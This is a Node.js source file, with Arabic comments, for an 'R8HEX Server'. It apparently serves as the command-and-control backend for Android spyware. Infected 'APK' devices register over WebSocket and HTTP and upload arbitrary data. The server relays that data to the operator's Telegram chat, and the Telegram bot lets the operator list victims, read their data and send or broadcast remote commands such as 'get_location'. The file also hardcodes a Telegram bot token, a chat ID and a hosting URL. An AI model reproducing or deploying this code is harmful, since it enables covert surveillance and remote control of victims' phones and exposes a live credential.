const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 10000;

// إعدادات التليجرام - التوكن الصحيح
const TELEGRAM_BOT_TOKEN = '8226229501:AAGhYt_mrsNz8fHDphyMw_C7qVFyZtJ90_E';
const TELEGRAM_CHAT_ID = '7604667042';

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { 
    polling: true,
    request: {
        agentOptions: {
            keepAlive: true,
            family: 4
        }
    }
});

// middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// تخزين البيانات
const apkDataStore = new Map(); // تخزين بيانات APK
const clients = new Map(); // عملاء WebSocket
const commandQueue = new Map(); // طابور الأوامر

// إنشاء خادم WebSocket
const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on: http://0.0.0.0:${PORT}`);
});

const wss = new WebSocket.Server({ server });

// معالجة اتصالات WebSocket
wss.on('connection', (ws, req) => {
    const clientId = generateClientId();
    const clientInfo = {
        ws: ws,
        id: clientId,
        type: 'unknown', // apk أو web
        ip: req.socket.remoteAddress,
        connectedAt: new Date()
    };
    
    clients.set(clientId, clientInfo);
    
    console.log(`🔗 New connection: ${clientId} from ${clientInfo.ip}`);
    
    // إرسال رسالة ترحيب
    ws.send(JSON.stringify({
        type: 'welcome',
        clientId: clientId,
        message: 'Connected to R8HEX Server',
        timestamp: Date.now()
    }));

    // إرسال إشعار للتليجرام
    sendTelegramMessage(`🟢 New connection: ${clientId}\n📍 IP: ${clientInfo.ip}`);

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            console.log(`📨 Received from ${clientId}:`, data);
            
            // تحديد نوع العميل
            if (data.type === 'apk_register') {
                clientInfo.type = 'apk';
                clientInfo.deviceId = data.deviceId;
                console.log(`📱 APK registered: ${clientId} - ${data.deviceId}`);
                sendTelegramMessage(`📱 APK Registered:\nDevice: ${data.deviceId}\nClient: ${clientId}`);
            }
            
            // معالجة بيانات APK
            if (data.type === 'apk_data' && clientInfo.type === 'apk') {
                handleAPKData(clientId, data);
            }
            
            // الرد على ping
            if (data.type === 'ping') {
                ws.send(JSON.stringify({
                    type: 'pong',
                    clientId: clientId,
                    timestamp: Date.now()
                }));
            }
            
        } catch (error) {
            console.error('❌ Error parsing message:', error);
        }
    });

    ws.on('close', () => {
        clients.delete(clientId);
        console.log(`🔴 Client disconnected: ${clientId}`);
        if (clientInfo.type === 'apk') {
            sendTelegramMessage(`🔴 APK Disconnected: ${clientInfo.deviceId || clientId}`);
        }
    });

    ws.on('error', (error) => {
        console.error(`❌ WebSocket error for ${clientId}:`, error);
    });
});

// معالجة بيانات APK من HTTP
app.post('/data', (req, res) => {
    console.log('📱 Received APK data via HTTP:', req.body);
    
    const deviceId = req.body.deviceId || generateClientId();
    const data = {
        ...req.body,
        receivedVia: 'http',
        timestamp: new Date().toISOString(),
        serverTime: Date.now()
    };
    
    // تخزين البيانات
    if (!apkDataStore.has(deviceId)) {
        apkDataStore.set(deviceId, []);
    }
    apkDataStore.get(deviceId).push(data);
    
    // الاحتفاظ بآخر 100 سجل فقط
    if (apkDataStore.get(deviceId).length > 100) {
        apkDataStore.get(deviceId).shift();
    }
    
    // إرسال إشعار للتليجرام
    sendTelegramMessage(`📱 APK Data (HTTP):\nDevice: ${deviceId}\nData: ${JSON.stringify(req.body, null, 2)}`);
    
    res.json({
        success: true,
        message: 'Data received successfully',
        deviceId: deviceId,
        timestamp: data.timestamp,
        serverTime: data.serverTime
    });
});

// استقبال بيانات من APK بصيغة مختلفة
app.post('/apk', (req, res) => {
    console.log('📱 Received APK data via /apk:', req.body);
    
    const deviceId = req.body.deviceId || req.body.id || generateClientId();
    const data = {
        ...req.body,
        receivedVia: 'http_apk',
        timestamp: new Date().toISOString(),
        serverTime: Date.now()
    };
    
    handleAPKData(deviceId, data);
    
    res.json({
        success: true,
        message: 'APK data received',
        deviceId: deviceId,
        timestamp: data.timestamp
    });
});

// وظيفة معالجة بيانات APK
function handleAPKData(clientId, data) {
    const deviceId = data.deviceId || clientId;
    
    if (!apkDataStore.has(deviceId)) {
        apkDataStore.set(deviceId, []);
    }
    
    const processedData = {
        ...data,
        clientId: clientId,
        processedAt: new Date().toISOString(),
        serverTime: Date.now()
    };
    
    apkDataStore.get(deviceId).push(processedData);
    
    // الاحتفاظ بآخر 100 سجل فقط
    if (apkDataStore.get(deviceId).length > 100) {
        apkDataStore.get(deviceId).shift();
    }
    
    // إرسال إشعار للتليجرام للبيانات المهمة
    if (data.important || data.message || data.status) {
        sendTelegramMessage(`📱 APK Data (WebSocket):\nDevice: ${deviceId}\nData: ${JSON.stringify(data, null, 2)}`);
    }
    
    console.log(`💾 Stored APK data for ${deviceId}:`, processedData);
}

// إرسال أوامر للـ APK
function sendCommandToAPK(deviceId, command, parameters = {}) {
    const commandData = {
        type: 'command',
        command: command,
        parameters: parameters,
        timestamp: new Date().toISOString(),
        commandId: generateCommandId()
    };
    
    // البحث عن APK متصل
    let sent = false;
    clients.forEach((client, clientId) => {
        if (client.type === 'apk' && (client.deviceId === deviceId || deviceId === 'all')) {
            if (client.ws.readyState === WebSocket.OPEN) {
                client.ws.send(JSON.stringify(commandData));
                console.log(`📤 Sent command to ${clientId}: ${command}`);
                sent = true;
            }
        }
    });
    
    // إذا لم يتم الإرسال، نضيف في طابور الأوامر
    if (!sent && deviceId !== 'all') {
        if (!commandQueue.has(deviceId)) {
            commandQueue.set(deviceId, []);
        }
        commandQueue.get(deviceId).push(commandData);
        console.log(`⏳ Command queued for ${deviceId}: ${command}`);
    }
    
    return {
        sent: sent,
        queued: !sent,
        commandId: commandData.commandId,
        deviceId: deviceId
    };
}

// معالجة بوت التليجرام
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    console.log(`🤖 Telegram message from ${chatId}: ${text}`);
    
    // التحقق من أن المرسل هو المطور
    if (chatId.toString() !== TELEGRAM_CHAT_ID) {
        bot.sendMessage(chatId, '❌ Unauthorized access. This bot is for admin use only.');
        return;
    }
    
    // الأوامر الأساسية
    if (text === '/start') {
        const apkCount = Array.from(clients.values()).filter(c => c.type === 'apk').length;
        const webCount = Array.from(clients.values()).filter(c => c.type === 'web').length;
        
        bot.sendMessage(chatId, 
            `🚀 R8HEX Server Bot\n\n` +
            `✅ Server Status: Online\n` +
            `📱 APK Clients: ${apkCount}\n` +
            `🌐 Web Clients: ${webCount}\n` +
            `🔗 Total Connections: ${clients.size}\n` +
            `🌐 URL: https://king14-85jp.onrender.com\n\n` +
            `📋 Available Commands:\n` +
            `/devices - List connected APKs\n` +
            `/data [deviceId] - Get APK data\n` +
            `/send [deviceId] [command] - Send command\n` +
            `/broadcast [command] - Send to all APKs\n` +
            `/status - Server status\n` +
            `/help - Show all commands`
        );
    }
    else if (text === '/devices') {
        const apkClients = Array.from(clients.values()).filter(c => c.type === 'apk');
        if (apkClients.length === 0) {
            bot.sendMessage(chatId, '❌ No APK devices connected');
        } else {
            let message = `📱 Connected APK Devices (${apkClients.length}):\n\n`;
            apkClients.forEach((client, index) => {
                message += `${index + 1}. ${client.deviceId || client.id}\n`;
                message += `   IP: ${client.ip}\n`;
                message += `   Connected: ${timeAgo(client.connectedAt)}\n\n`;
            });
            bot.sendMessage(chatId, message);
        }
    }
    else if (text.startsWith('/data')) {
        const parts = text.split(' ');
        const deviceId = parts[1] || 'all';
        
        if (deviceId === 'all') {
            let message = `📊 Data from all devices:\n\n`;
            apkDataStore.forEach((dataArray, devId) => {
                const lastData = dataArray[dataArray.length - 1];
                message += `📱 ${devId}:\n`;
                message += `Last: ${JSON.stringify(lastData)}\n\n`;
            });
            bot.sendMessage(chatId, message.length > 4000 ? message.substring(0, 4000) + '...' : message);
        } else {
            const data = apkDataStore.get(deviceId);
            if (!data || data.length === 0) {
                bot.sendMessage(chatId, `❌ No data found for device: ${deviceId}`);
            } else {
                const lastData = data[data.length - 1];
                bot.sendMessage(chatId, 
                    `📊 Last data from ${deviceId}:\n\n` +
                    `${JSON.stringify(lastData, null, 2)}`
                );
            }
        }
    }
    else if (text.startsWith('/send')) {
        const parts = text.split(' ');
        if (parts.length < 3) {
            bot.sendMessage(chatId, '❌ Usage: /send [deviceId] [command] {parameters}\nExample: /send device123 get_location');
            return;
        }
        
        const deviceId = parts[1];
        const command = parts[2];
        const parameters = parts.slice(3).join(' ');
        
        const result = sendCommandToAPK(deviceId, command, { parameters });
        
        if (result.sent) {
            bot.sendMessage(chatId, `✅ Command sent to ${deviceId}: ${command}`);
        } else if (result.queued) {
            bot.sendMessage(chatId, `⏳ Command queued for ${deviceId}: ${command}\n(Device not connected)`);
        } else {
            bot.sendMessage(chatId, `❌ Failed to send command to ${deviceId}`);
        }
    }
    else if (text.startsWith('/broadcast')) {
        const command = text.replace('/broadcast ', '');
        if (!command) {
            bot.sendMessage(chatId, '❌ Usage: /broadcast [command]');
            return;
        }
        
        const result = sendCommandToAPK('all', 'broadcast', { message: command });
        bot.sendMessage(chatId, `📢 Broadcast sent to all APKs: ${command}\n(Sent to ${clients.size} devices)`);
    }
    else if (text === '/status') {
        const memoryUsage = Math.round(process.memoryUsage().rss / 1024 / 1024);
        const uptime = Math.round(process.uptime());
        const apkCount = Array.from(clients.values()).filter(c => c.type === 'apk').length;
        
        bot.sendMessage(chatId, 
            `📊 Server Status:\n` +
            `🟢 Status: Online\n` +
            `📱 APK Devices: ${apkCount}\n` +
            `🌐 Web Clients: ${clients.size - apkCount}\n` +
            `💾 Memory: ${memoryUsage}MB\n` +
            `⏰ Uptime: ${uptime}s\n` +
            `📈 Data Stores: ${apkDataStore.size}`
        );
    }
    else if (text === '/help') {
        bot.sendMessage(chatId,
            `📋 R8HEX Bot Commands:\n\n` +
            `🔹 /start - Start bot and show status\n` +
            `🔹 /devices - List connected APK devices\n` +
            `🔹 /data [deviceId] - Get device data (use 'all' for all)\n` +
            `🔹 /send [deviceId] [command] - Send command to APK\n` +
            `🔹 /broadcast [command] - Send command to all APKs\n` +
            `🔹 /status - Server status\n` +
            `🔹 /help - This message\n\n` +
            `🌐 Endpoints for APK:\n` +
            `POST /data - Send APK data\n` +
            `POST /apk - Alternative endpoint\n` +
            `WebSocket - Real-time communication`
        );
    }
    else {
        bot.sendMessage(chatId, '❌ Unknown command. Use /help for available commands.');
    }
});

// وظائف مساعدة
function generateClientId() {
    return 'client_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
}

function generateCommandId() {
    return 'cmd_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
}

function timeAgo(date) {
    const seconds = Math.floor((new Date() - date) / 1000);
    if (seconds < 60) return `${seconds} seconds ago`;
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `${minutes} minutes ago`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `${hours} hours ago`;
    const days = Math.floor(hours / 24);
    return `${days} days ago`;
}

function sendTelegramMessage(message) {
    bot.sendMessage(TELEGRAM_CHAT_ID, message)
        .catch(error => {
            console.error('❌ Failed to send Telegram message:', error.message);
        });
}

// مسارات HTTP الإضافية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/status', (req, res) => {
    const apkCount = Array.from(clients.values()).filter(c => c.type === 'apk').length;
    
    res.json({
        status: 'online',
        server: 'R8HEX Server',
        timestamp: new Date().toISOString(),
        connections: {
            total: clients.size,
            apk: apkCount,
            web: clients.size - apkCount
        },
        data: {
            devices: apkDataStore.size,
            totalRecords: Array.from(apkDataStore.values()).reduce((sum, arr) => sum + arr.length, 0)
        },
        memory: {
            used: Math.round(process.memoryUsage().rss / 1024 / 1024) + 'MB',
            uptime: Math.round(process.uptime()) + 's'
        }
    });
});

// معالجة الأخطاء
process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error);
    sendTelegramMessage(`❌ Server Error: ${error.message}`);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
});

// إرسال رسالة بدء التشغيل
console.log('🤖 Telegram bot ready');
console.log('📱 Ready for APK connections');
console.log('🔗 WebSocket: ws://0.0.0.0:' + PORT);

// إرسال إشعار بدء التشغيل
setTimeout(() => {
    sendTelegramMessage(
        `🚀 R8HEX Server Started!\n\n` +
        `📍 URL: https://king14-85jp.onrender.com\n` +
        `📡 Port: ${PORT}\n` +
        `⏰ Time: ${new Date().toLocaleString()}\n` +
        `👥 Ready for APK connections`
    );
}, 3000);
